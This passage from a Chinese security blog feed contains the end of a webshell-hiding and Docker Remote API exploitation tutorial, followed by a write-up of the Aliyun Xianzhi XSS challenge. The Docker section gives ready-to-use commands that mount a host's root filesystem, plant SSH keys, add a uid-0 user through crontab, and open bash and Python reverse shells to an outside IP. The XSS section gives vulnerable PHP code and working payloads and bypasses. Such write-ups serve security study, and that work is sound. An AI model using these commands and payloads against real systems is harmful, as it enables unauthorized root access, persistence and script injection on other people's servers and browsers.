class="built_in">system</span>.web&gt;</span><br><span class="line"># 省略其他</span><br><span class="line">    <span class="symbol">&lt;httpHandlers&gt;</span></span><br><span class="line">        &lt;<span class="built_in">add</span> <span class="keyword">verb</span>=<span class="string">"*"</span> path=<span class="string">"aabb.aspx"</span> <span class="built_in">type</span>=<span class="string">"ASP.aabb_aspx,App_Web_amovoubm"</span> validate=<span class="string">"True"</span>/&gt;</span><br><span class="line">    &lt;/httpHandlers&gt;</span><br><span class="line">  &lt;/<span class="built_in">system</span>.web&gt;</span><br></pre></td></tr></table></figure></li><li><p>将Dll文件copy到目标主机网站根目录/bin目录下访问网站链接木马路径即可</p></li></ol><h2 id="0x02-Remote-API利用姿势"><a href="#0x02-Remote-API利用姿势" class="headerlink" title="0x02 Remote API利用姿势"></a>0x02 Remote API利用姿势</h2><p>主要问题：docker remote api未授权</p><h3 id="1-测试环境准备"><a href="#1-测试环境准备" class="headerlink" title="1.测试环境准备"></a>1.测试环境准备</h3><p>测试环境：快捷安装shipyard(docker图形化管理)，未设置访问权限</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#在安装docker环境下</span><br><span class="line">curl -sSL https://shipyard-project.com/deploy | bash -s</span><br></pre></td></tr></table></figure><h3 id="2-漏洞检测与利用准备"><a href="#2-漏洞检测与利用准备" class="headerlink" title="2.漏洞检测与利用准备"></a>2.漏洞检测与利用准备</h3><ul><li><p>查看docker集群信息</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span> -H 目标<span class="built_in">IP</span> <span class="meta">info</span></span><br></pre></td></tr></table></figure></li><li><p>查看docker集群镜像</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span> -H 目标<span class="built_in">IP</span> images</span><br></pre></td></tr></table></figure></li><li><p>在目标服务器建立docker容器（最好选择服务器已有镜像），并挂载目标服务器所有文件路径到容器/var/hack路径下</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H 目标IP run -d -v /<span class="symbol">:/var/hack</span> --name getshell tutum/lamp</span><br></pre></td></tr></table></figure></li><li><p>进入docker容器进行漏洞利用（此处name为getshell</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H <span class="number">123.207</span>.*.* exec -<span class="keyword">it</span> getshell /bin/bash</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-漏洞利用姿势"><a href="#3-漏洞利用姿势" class="headerlink" title="3.漏洞利用姿势"></a>3.漏洞利用姿势</h3><p><strong>3.1上传公钥证书直接root登录</strong><br>生成公私钥对</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>上传公钥到目标主机/root/.ssh/authorized_keys文件，然后ssh直接登录root（如果私钥设置密码，需要输入密码）</p><p><strong>3.2修改crontab添加root权限用户</strong><br>编辑/etc/crontab文件最后添加</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*/<span class="number">1</span> * * * *  root /usr/sbin/useradd 用户名-u <span class="number">0</span> -g <span class="number">0</span> -o &amp;&amp; echo <span class="string">"用户名:密码"</span>|chpasswd</span><br><span class="line">*/<span class="number">1</span> * * * *  root /usr/sbin/useradd <span class="number">123</span> -u <span class="number">0</span> -g <span class="number">0</span> -o &amp;&amp; echo <span class="string">"123:123456"</span>|chpasswd</span><br></pre></td></tr></table></figure><p>ssh连接，使用新建的用户名密码登录<br><strong>3.3修改crontab反弹shell</strong><br>bash版（前两句代码指定运行的环境变量）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">*/1 * * * *  root bash -i &gt;&amp; /dev/tcp/123.207.*.*/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p><p>python版<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*/<span class="number">1</span> * * * *  rootpython -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("123.207.*.*",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br><span class="line">python -c <span class="string">'import os;os.popen("bash -i &gt;&amp; /dev/tcp/123.207.*.*/8888 0&gt;&amp;1");'</span></span><br></pre></td></tr></table></figure></p><p><strong>3.4编写web目录下的文件直接getshell</strong><br>这个不多说</p><p><strong>提示:</strong><br>本博客里任何文章/动画/教程以及各类软件/工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负。</p>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ASPX </tag>
            
            <tag> Webshell隐藏 </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>阿里先知XSS挑战赛</title>
      <link href="/2017/08/30/alixss/"/>
      <url>/2017/08/30/alixss/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近阿里先知论坛发起XSS挑战赛，记录一下自己做出的几道题的思路<br><a id="more"></a></p><h2 id="0x01-题目及解答"><a href="#0x01-题目及解答" class="headerlink" title="0x01 题目及解答"></a>0x01 题目及解答</h2><h3 id="1-XSS-文件上传"><a href="#1-XSS-文件上传" class="headerlink" title="1.XSS-文件上传"></a>1.XSS-文件上传</h3><p><strong>两个文件的源码如下</strong><br>xss1.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"X-XSS-Protection: 0"</span>);</span></span><br><span class="line"><span class="php">$target_dir = <span class="string">"uploads/"</span>;</span></span><br><span class="line"><span class="php">$target_file = $target_dir . basename($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]);</span></span><br><span class="line"><span class="php">$uploadOk = <span class="number">1</span>;</span></span><br><span class="line"><span class="php">$imageFileType = pathinfo($target_file,PATHINFO_EXTENSION);</span></span><br><span class="line"><span class="php"><span class="comment">// Check if image file is a actual image or fake image</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span></span><br><span class="line"><span class="php">    $check = getimagesize($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"tmp_name"</span>]);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($check !== <span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"File is an image - "</span> . $check[<span class="string">"mime"</span>] . <span class="string">".&lt;BR&gt;"</span>;</span></span><br><span class="line"><span class="php">        $uploadOk = <span class="number">1</span>;</span></span><br><span class="line"><span class="php">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"File is not an image."</span>;</span></span><br><span class="line"><span class="php">        $uploadOk = <span class="number">0</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">// Check if file already exists</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (file_exists($target_file)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Sorry, file already exists."</span>;</span></span><br><span class="line"><span class="php">    $uploadOk = <span class="number">0</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">// Check file size</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"size"</span>] &gt; <span class="number">500000</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Sorry, your file is too large."</span>;</span></span><br><span class="line"><span class="php">    $uploadOk = <span class="number">0</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">// Allow certain file formats</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($imageFileType != <span class="string">"jpg"</span> &amp;&amp; $imageFileType != <span class="string">"png"</span> &amp;&amp; $imageFileType != <span class="string">"jpeg"</span></span></span><br><span class="line"><span class="php">&amp;&amp; $imageFileType != <span class="string">"gif"</span> ) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed."</span>;</span></span><br><span class="line"><span class="php">    $uploadOk = <span class="number">0</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">// Check if $uploadOk is set to 0 by an error</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($uploadOk == <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Sorry, your file was not uploaded."</span>;</span></span><br><span class="line"><span class="php"><span class="comment">// if everything is ok, try to upload file</span></span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"The file "</span>. basename( $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]). <span class="string">" has been uploaded."</span>;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>xss1.htm<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"xss1.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    Select image to upload:</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"fileToUpload"</span> <span class="attr">id</span>=<span class="string">"fileToUpload"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Upload Image"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>解题思路</strong><br>直接上传一个构造好文件名的图片即可触发xss，但是实际使用中不可能要求攻击对象自己上传图片并burp修改文件名，难点在如何构造一个POST包自动模拟上传文件，参考：<a href="https://xianzhi.aliyun.com/forum/read/224.html" target="_blank" rel="noopener">从XSSer的角度测试上传文件功能</a>，可以在IE浏览器下实现文件上传模拟，这里需要先上传正常图片burp抓包对比，然后构造对应的字段，而且不能再filename中出现字符<code>/</code>,最后构造poc文件如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">utf-8</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">accept-charset</span>=<span class="string">"utf-8"</span> <span class="attr">action</span>=<span class="string">"http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss1.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">'fileToUpload"; filename="&lt;svg onload=alert(document.domain);&gt;GIF89a1.jpg'</span> <span class="attr">Content-Type</span>=<span class="string">"image/jpeg"</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">'form'</span>).submit();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="2-XSS-referrer和REQUEST-URI"><a href="#2-XSS-referrer和REQUEST-URI" class="headerlink" title="2.XSS-referrer和REQUEST_URI"></a>2.XSS-referrer和REQUEST_URI</h3><p><strong>两个题的源码</strong><br>xss4.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"X-XSS-Protection: 0"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"你来自:"</span>.$_SERVER[<span class="string">'HTTP_REFERER'</span>];<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>xss13.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"X-XSS-Protection: 0"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"REQUEST_URI:"</span>.$_SERVER[<span class="string">'REQUEST_URI'</span>];</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p><strong>解题思路</strong><br>直接返回请求的referer值或REQUEST_URI到页面上，所以可以插入执行XSS<br>第一种解法：由于chrome和firefox浏览器以及win10版的IE浏览器均会把referer及REQUEST_URI采用URL编码，所以不能成功执行XSS脚本，但是可以在Win7操作系统下的IE浏览器上不会进行URL编码，可以利用如下脚本跳转触发XSS,<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">"http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss4.php"</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>请求url为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localshot/xss4.html?<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>第二种解法：利用flash跳转可以在Win10的IE下成功执行XSS,参考<a href="https://paper.seebug.org/61/" target="_blank" rel="noopener">XSS via Referrer After Anniversary Update</a><br>（1）利用navigateToURL跳转<br>利用Adobe Flash Professional CS6工具，新建ActionScript文件命名xss_referrer.as，内容如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package &#123;</span><br><span class="line"> <span class="keyword">import</span> flash.display.Sprite;</span><br><span class="line"> <span class="keyword">import</span> flash.net.URLRequest;</span><br><span class="line"> <span class="keyword">import</span> flash.net.navigateToURL;</span><br><span class="line"> public <span class="class"><span class="keyword">class</span> <span class="title">xss_referrer</span> <span class="keyword">extends</span> <span class="title">Sprite</span></span>&#123;</span><br><span class="line">  public <span class="function"><span class="keyword">function</span> <span class="title">xss_referrer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  public <span class="function"><span class="keyword">function</span> <span class="title">xss</span>(<span class="params"></span>):<span class="title">String</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> url:URLRequest = <span class="keyword">new</span> URLRequest(<span class="string">"http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss4.php"</span>);</span><br><span class="line">    navigateToURL(url, <span class="string">"_self"</span>);  </span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">保存，然后新建ActionScript 3.0（.fla）文件，xss_referrer.as保存在同一目录下，F9进入动作编程界面，输入内容如下：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>javascript</span><br><span class="line"><span class="keyword">var</span> xss:xss_referrer = <span class="keyword">new</span> xss_referrer();</span><br></pre></td></tr></table></figure></p><p>接着导出为swf文件。<br>请求url为（Win10下的IE成功执行脚本）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localshot/xss4.swf?<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>（2）利用getURL跳转<br>利用Adobe Flash Professional CS6工具，新建ActionScript 2.0（.fla）文件，笔者测试如果选择ActionScript 3.0文件会提示没有getURL函数，输入内容如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">getURL</span><span class="params">(<span class="string">"http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss4.php"</span>,<span class="string">""</span>,<span class="string">"get"</span>)</span></span></span><br></pre></td></tr></table></figure><p>同样需要导出为swf文件<br>请求url为（Win10下的IE成功执行脚本）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localshot/xss4.swf?<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-XSS-跳转"><a href="#3-XSS-跳转" class="headerlink" title="3.XSS-跳转"></a>3.XSS-跳转</h3><p><strong>源码文件</strong><br>xss5.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"X-XSS-Protection: 0"</span>);</span></span><br><span class="line"><span class="php">$url=str_replace(urldecode(<span class="string">"%00"</span>),<span class="string">""</span>,$_GET[<span class="string">"url"</span>]);</span></span><br><span class="line"><span class="php">$url=str_replace(urldecode(<span class="string">"%0d"</span>),<span class="string">""</span>,$url);</span></span><br><span class="line"><span class="php">$url=str_replace(urldecode(<span class="string">"%0a"</span>),<span class="string">""</span>,$url);</span></span><br><span class="line"><span class="php">header(<span class="string">"Location: "</span>.$url);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"&lt;a href='"</span>.$url.<span class="string">"'&gt;如果跳转失败请点我&lt;/a&gt;"</span>;<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>解题思路</strong><br>开时想采用%00，%0a,%0d来阻止location跳转，参考<a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html#" target="_blank" rel="noopener">Bottle HTTP 头注入漏洞探究</a>，然而都过滤了，在朋友的指点下学习了不同解法<br>(1)gopher协议<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss5.php?url=gopher://123<span class="number">%27</span><span class="number">%20</span>./a<span class="number">%3</span>E<span class="number">%20</span><span class="number">%3</span>Cscript<span class="number">%3</span>Ealert(document.domain)<span class="number">%3</span>C/script<span class="number">%3</span>E</span><br></pre></td></tr></table></figure></p><p>(2)端口号（0、1、9、117等）<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss5.php?url=https://www.baidu.com:0?'<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="4-XSS-强制下载"><a href="#4-XSS-强制下载" class="headerlink" title="4.XSS-强制下载"></a>4.XSS-强制下载</h3><p><strong>源码文件</strong><br>xss6.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line">header(<span class="string">'Content-Disposition: attachment; filename="'</span>.$_GET[<span class="string">"filename"</span>].<span class="string">'"'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(substr($_GET[<span class="string">"url"</span>],<span class="number">0</span>,<span class="number">4</span>) ===<span class="string">"http"</span> &amp;&amp; substr($_GET[<span class="string">"url"</span>],<span class="number">0</span>,<span class="number">8</span>)&lt;&gt;<span class="string">"http://0"</span> &amp;&amp; substr($_GET[<span class="string">"url"</span>],<span class="number">0</span>,<span class="number">8</span>)&lt;&gt;<span class="string">"http://1"</span> &amp;&amp; substr($_GET[<span class="string">"url"</span>],<span class="number">0</span>,<span class="number">8</span>)&lt;&gt;<span class="string">"http://l"</span> &amp;&amp; strpos($_GET[<span class="string">"url"</span>], <span class="string">'@'</span>) === <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">$opts = <span class="keyword">array</span>(<span class="string">'http'</span> =&gt;</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'method'</span> =&gt; <span class="string">'GET'</span>,</span><br><span class="line">        <span class="string">'max_redirects'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">        <span class="string">'ignore_errors'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line">$context = stream_context_create($opts);</span><br><span class="line">$url=str_replace(<span class="string">".."</span>,<span class="string">""</span>,$_GET[<span class="string">"url"</span>]);</span><br><span class="line">$stream = fopen($url, <span class="string">'r'</span>, <span class="keyword">false</span>, $context);</span><br><span class="line"><span class="keyword">echo</span> stream_get_contents($stream);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Bad URL!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>解题思路</strong><br>%00 %0a %0d来阻止下载，返回目标问文件内容导致xss，<br>xss6.txt的内容为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>还有这里需要使用域名的方式绕过限制,请求URL如下：<br><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ec2<span class="string">-13</span><span class="string">-58</span><span class="string">-146</span><span class="string">-2</span>.us-east<span class="string">-2</span>.compute.amazonaws.com/xss6.php?filename=%00&lt;11111111111111&gt;download&amp;url=http://xxxxxxxx.eu5.org/xss6.txt</span><br></pre></td></tr></table></figure></p><h3 id="5-XSS-HIDDEN"><a href="#5-XSS-HIDDEN" class="headerlink" title="5.XSS-HIDDEN"></a>5.XSS-HIDDEN</h3><p><strong>源码文件</strong><br>xss14.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 